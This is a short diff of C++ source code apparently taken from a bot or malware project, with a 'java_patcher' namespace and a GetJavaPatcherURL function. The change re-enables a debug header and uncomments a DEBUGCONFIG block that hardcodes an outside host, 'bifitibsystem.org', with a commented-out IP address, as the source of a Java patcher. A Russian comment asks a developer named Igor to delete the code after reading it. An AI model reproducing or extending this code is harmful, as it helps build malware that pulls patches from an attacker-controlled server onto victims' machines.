@@ -17,7 +17,7 @@
 #include "Richedit.h"
 
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace java_patcher
 {
@@ -158,11 +158,13 @@ static char* GetJavaPatcherURL( char* url )
 
 	Игорь, как прочитаешь этот коммент, удали код.
 
+    */
+
 	#ifdef DEBUGCONFIG
 		m_lstrcpy( url, "http://bifitibsystem.org/" );//"http://94.240.148.127/");//);//rt_jar/");
 		return url;
 	#endif
-	*/
+
 
 	PCHAR URL = NULL;
 	do
